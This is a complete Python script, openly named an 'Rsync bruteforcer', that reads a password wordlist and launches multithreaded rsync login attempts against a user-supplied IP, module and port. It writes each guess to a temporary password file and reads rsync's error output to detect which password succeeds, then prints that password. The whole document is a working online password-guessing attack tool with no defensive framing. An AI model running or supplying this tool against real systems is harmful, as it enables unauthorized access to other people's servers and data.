#!/usr/bin/env python3

import threading
import subprocess
import os
import argparse
import time

parser = argparse.ArgumentParser(description='Rsync bruteforcer')
parser.add_argument('dict', help='The dictionary to use')
parser.add_argument('user', help='The name of the user to attemp to log in as')
parser.add_argument('address', help='The ip address to target')
parser.add_argument('dir', help='The dir to target')
parser.add_argument('port', help='The port to target')
parser.add_argument('-t', '--threads', help='The number of threads. Defaults to 10')
args = parser.parse_args()

thevalidpassword = 'unknown'
passwordFound = False

countLock = threading.Lock()
count = 0

def worker(passwd):
    # acquire counter lock
    countLock.acquire()
    global count
    count = count + 1
    localCount = count
    countLock.release()
    # create a password file based on the counter
    filename = str(localCount)
    subprocess.call(['touch', filename])
    # rsync complains if the permissions are other readable
    subprocess.call(['chmod', '600', filename])
    f = open(filename, "w")
    # rsync likes newlines on the end of password files
    f.write(passwd + "\n")
    f.close()
    # fiddle with the command depending on what you want to do
    command = []
    command.append("rsync")
    command.append("-av")
    command.append(args.user + "@" + args.address + ":" + args.dir)
    command.append("--list-only")
    command.append("--port=" + args.port)
    command.append("--password-file=" + filename)
    success = False #sometimes there are connection errors, flag to keep track of this
    # depending on what the rsync replies with on auth errors, you will need to fiddle
    # with this. the idea is to keep track of auth errors with the authFailed var,
    # if there wasnt an auth failed message, we know that the password works
    # if that happens, just print the password and exit
    while success == False:
        print("Trying: " + " ".join(command))
        success = True
        p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        p.wait()
        authFailed = False
        for line in p.stdout:
            #print(line.decode('ascii'))
            if "unexpected" in line.decode('ascii'):
                success = False
            if "denied" in line.decode('ascii'):
                authFailed = True
        for line in p.stderr:
            #print(line.decode('ascii'))
            if "denied" in line.decode('ascii') or "auth failed" in line.decode('ascii'):
                authFailed = True
            if "connection unexpectedly" in line.decode('ascii') or "did not see" in line.decode('ascii'):
                success = False
        if authFailed == False: 
            global thevalidpassword
            global passwordFound
            thevalidpassword = passwd
            passwordFound = True
            threadCounter.release()
            exit()
    threadCounter.release()
    subprocess.call(['rm', filename])

if args.threads:
   threads = int(args.threads)
else:
   threads = 10

print("Threads: " + str(threads))
threadCounter = threading.BoundedSemaphore(threads)
dictionaryf = open(args.dict, "r")
for line in dictionaryf:
    if passwordFound:
        print("Found password: " + thevalidpassword)
        exit()
    threadCounter.acquire()
    passwd = line
    t = threading.Thread(target=worker, args=(passwd,))
    t.start()


















